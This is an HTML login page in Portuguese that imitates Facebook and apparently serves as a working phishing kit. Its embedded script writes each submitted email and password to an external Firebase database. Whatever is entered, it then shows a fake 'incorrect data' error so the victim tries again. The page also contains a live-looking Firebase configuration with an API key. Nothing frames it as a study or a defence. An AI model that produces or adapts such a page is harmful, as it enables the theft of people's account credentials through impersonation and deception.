<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Exemplo</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <div class="login-box">
        <h1 class="h1">Facebook</h1>
        <form id="loginForm">
            <div class="textbox">
                <input type="text" id="email" placeholder="E-mail ou Telefone" required>
            </div>
            <div class="textbox">
                <input type="password" id="senha" placeholder="Senha" required>
            </div>
            <input type="submit" class="btn" value="Entrar">
            <p class="signup">Não tem uma conta? <a href="#">Crie uma agora</a></p>
        </form>
        <p id="errorMessage" style="color: red; display: none;"></p> <!-- Mensagem de erro -->
    </div>
</div>
<script type="module">
    // Importar as funções que você precisa do SDK
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";

    // Configuração do Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyAXdwi-qCwEVkNsCje4c-R6izIKCI1S5EU",
        authDomain: "dadosinf-bb992.firebaseapp.com",
        databaseURL: "https://dadosinf-bb992-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "dadosinf-bb992",
        storageBucket: "dadosinf-bb992.appspot.com",
        messagingSenderId: "84033846465",
        appId: "1:84033846465:web:2a04bc2dc851372e6f2840",
        measurementId: "G-TPSEG409WB"
    };

    // Inicializar o Firebase
    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const database = getDatabase(app);

    // Manipulador de submissão do formulário
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        const email = document.getElementById('email').value;
        const senha = document.getElementById('senha').value;

        // Enviar dados para o Firebase
        set(ref(database, 'users/' + email.replace('.', ',')), { // Replace '.' para evitar erros com chaves do Firebase
            email: email,
            senha: senha
        }).then(() => {
            // Sempre exibir mensagem de erro após o envio dos dados
            document.getElementById('errorMessage').innerText = 'Dados incorretos. Tente novamente.';
            document.getElementById('errorMessage').style.display = 'block'; // Exibir a mensagem de erro
        }).catch((error) => {
            console.error('Erro ao enviar dados: ', error);
            // Também exiba a mensagem de erro em caso de falha
            document.getElementById('errorMessage').innerText = 'Erro ao enviar dados. Tente novamente.';
            document.getElementById('errorMessage').style.display = 'block'; // Exibir a mensagem de erro
        });
    });
</script>

</body>
</html>
